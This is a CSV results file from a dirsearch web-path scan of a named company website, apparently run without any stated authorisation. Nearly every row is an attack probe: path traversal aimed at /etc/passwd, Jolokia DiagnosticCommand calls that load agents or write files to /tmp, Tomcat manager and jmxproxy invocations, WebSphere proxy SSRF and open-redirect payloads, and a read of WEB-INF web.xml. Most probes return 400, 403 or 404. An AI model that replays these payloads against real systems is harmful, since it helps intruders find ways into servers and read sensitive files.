Column1,Column2,Column3,Column4,Column5,Column6,Column7,Column8,Column9,Column10,Column11,Column12,Column13,Column14,Column15
#,Dirsearch,started,2025-02-04,00:12:43,as:,dirsearch.py,-u,http://www.vipinfo.com.cn/,-t,50,--random-agent,-o,result.csv,-f
,,,,,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.asp,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.aspx,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.html,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.htm,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.jsp,,,,,,,,,,
400,,,623B,http://www.vipinfo.com.cn/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd.php,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.php,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.jsp,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.asp,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.aspx,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff/,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.html,,,,,,,,,,
400,,,324B,http://www.vipinfo.com.cn/%ff.htm,,,,,,,,,,
403,,,748B,http://www.vipinfo.com.cn/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../,,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/.ashx,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/.asmx,,,,,,,,,
403,,,312B,http://www.vipinfo.com.cn/\..\..\..\..\..\..\..\..\..\etc\passwd,,,,,,,,,,
200,,,,5KB,http://www.vipinfo.com.cn/AboutUs.html,,,,,,,,,
200,,,,5KB,http://www.vipinfo.com.cn/aboutus.html,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/admin%20/,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/admin.,,,,,,,,,
403,,,682B,http://www.vipinfo.com.cn/admin/portalcollect.php?f=http://xxx&t=js,,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/asset..,,,,,,,,,
200,,,,5KB,http://www.vipinfo.com.cn/business.html,,,,,,,,,
200,,,,7KB,http://www.vipinfo.com.cn/company.html,,,,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/css/,,,,,,,,,
301,,,153B,http://www.vipinfo.com.cn/css,,->,,http://www.vipinfo.com.cn/css/,,,,,,
200,,,,6KB,http://www.vipinfo.com.cn/customers.html,,,,,,,,,
403,,,770B,http://www.vipinfo.com.cn/docpicker/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console,,,,,,,,,
403,,,685B,http://www.vipinfo.com.cn/examples/jsp/%252e%252e/%252e%252e/manager/html/,,,,,,,,,,
403,,,685B,http://www.vipinfo.com.cn/faces/javax.faces.resource/web.xml?ln=../WEB-INF,,,,,,,,,,
200,,,,1KB,http://www.vipinfo.com.cn/favicon.ico,,,,,,,,,
200,,,,7KB,http://www.vipinfo.com.cn/HISTORY.html,,,,,,,,,
200,,,,7KB,http://www.vipinfo.com.cn/history.html,,,,,,,,,
301,,,156B,http://www.vipinfo.com.cn/images,,->,,http://www.vipinfo.com.cn/images/,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/images/,,,,,,,,,
200,,,,6KB,http://www.vipinfo.com.cn/index.html,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/index.php.,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/javax.faces.resource.../,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/read/java.lang:type=*/HeapMemoryUsage,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/java.lang:type=Memory/gc,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable,,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used,,,,,,,,,
400,,,,3KB,"http://www.vipinfo.com.cn/jolokia/search/*:j2eeType=J2EEServer,*.aspx",,,,,,,,,
400,,,,3KB,http://www.vipinfo.com.cn/jolokia/write/java.lang:type=Memory/Verbose/true,,,,,,,,,
400,,,,3KB,"http://www.vipinfo.com.cn/jolokia/search/*:j2eeType=J2EEServer,*",,,,,,,,,
400,,,,3KB,"http://www.vipinfo.com.cn/jolokia/search/*:j2eeType=J2EEServer,*/",,,,,,,,,
301,,,152B,http://www.vipinfo.com.cn/js,,->,,http://www.vipinfo.com.cn/js/,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/js/,,,,,,,,,
200,,,,7KB,http://www.vipinfo.com.cn/library.html,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/login.wdm%2e,,,,,,,,,
403,,,645B,http://www.vipinfo.com.cn/manager/,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/jmxproxy.jsp,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/admin.asp,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/html.aspx,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/html.html,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/jmxproxy.php,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/jmxproxy,,,,,,,,,,
403,,,650B,http://www.vipinfo.com.cn/manager/html/,,,,,,,,,,
403,,,701B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/html.php,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/html.asp,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/html.htm,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/jmxproxy.htm,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/jmxproxy.asp,,,,,,,,,,
403,,,649B,http://www.vipinfo.com.cn/manager/html,,,,,,,,,,
403,,,705B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.asp,,,,,,,,,,
403,,,658B,http://www.vipinfo.com.cn/manager/jmxproxy.html,,,,,,,,,,
403,,,705B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.jsp,,,,,,,,,,
403,,,658B,http://www.vipinfo.com.cn/manager/jmxproxy.aspx,,,,,,,,,,
403,,,724B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.php,,,,,,,,,,
403,,,724B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.asp,,,,,,,,,,
403,,,720B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS,,,,,,,,,,
403,,,705B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.htm,,,,,,,,,,
403,,,718B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=/,,,,,,,,,,
403,,,717B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/jmxproxy/,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.asp,,,,,,,,,,
403,,,722B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.aspx,,,,,,,,,,
403,,,706B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.html,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.jsp,,,,,,,,,,
403,,,722B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.html,,,,,,,,,,
403,,,724B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.jsp,,,,,,,,,,
403,,,702B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY/,,,,,,,,,,
403,,,665B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF/,,,,,,,,,,
403,,,668B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.php,,,,,,,,,,
403,,,668B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.jsp,,,,,,,,,,
403,,,705B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE/,,,,,,,,,,
403,,,669B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.aspx,,,,,,,,,,
403,,,668B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.asp,,,,,,,,,,
403,,,725B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.html,,,,,,,,,,
403,,,705B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.php,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS/,,,,,,,,,,
403,,,664B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.htm,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/html.jsp,,,,,,,,,,
403,,,704B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE,,,,,,,,,,
403,,,704B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/status/all/,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.php,,,,,,,,,,
403,,,650B,http://www.vipinfo.com.cn/manager/login,,,,,,,,,,
403,,,669B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.html,,,,,,,,,,
403,,,709B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.html,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.asp,,,,,,,,,,
403,,,724B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.htm,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.htm,,,,,,,,,,
403,,,668B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.htm,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.php,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/login.aspx,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.htm,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/login.html,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.jsp,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.php,,,,,,,,,,
403,,,725B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.aspx,,,,,,,,,,
403,,,660B,http://www.vipinfo.com.cn/manager/status/all.aspx,,,,,,,,,,
403,,,709B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.aspx,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.php,,,,,,,,,,
403,,,655B,http://www.vipinfo.com.cn/manager/status/all,,,,,,,,,,
403,,,706B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY.aspx,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.asp,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.asp,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/VERSION/,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.htm,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.jsp,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/VERSION.html,,,,,,,,,,
403,,,654B,http://www.vipinfo.com.cn/manager/login.asp,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.htm,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.php,,,,,,,,,,
403,,,651B,http://www.vipinfo.com.cn/manager/login/,,,,,,,,,,
403,,,659B,http://www.vipinfo.com.cn/manager/status/all.jsp,,,,,,,,,,
403,,,660B,http://www.vipinfo.com.cn/manager/status/all.html,,,,,,,,,,
403,,,652B,http://www.vipinfo.com.cn/manager/VERSION,,,,,,,,,,
403,,,657B,http://www.vipinfo.com.cn/manager/VERSION.aspx,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/VERSION.jsp,,,,,,,,,,
200,,,,5KB,http://www.vipinfo.com.cn/market.html,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/rating_over.,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/service.asmx,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/static..,,,,,,,,,
403,,,,2KB,http://www.vipinfo.com.cn/Trace.axd,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/umbraco/webservices/codeEditorSave.asmx,,,,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/uploads/,,,,,,,,,
403,,,,1KB,http://www.vipinfo.com.cn/uploads,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/WEB-INF./,,,,,,,,,
404,,,,2KB,http://www.vipinfo.com.cn/WebResource.axd?d=LER8t9aS,,,,,,,,,
403,,,764B,http://www.vipinfo.com.cn/wps/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,809B,http://www.vipinfo.com.cn/wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,762B,http://www.vipinfo.com.cn/wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,759B,http://www.vipinfo.com.cn/wps/myproxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
403,,,757B,http://www.vipinfo.com.cn/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,,,,,,,,,,
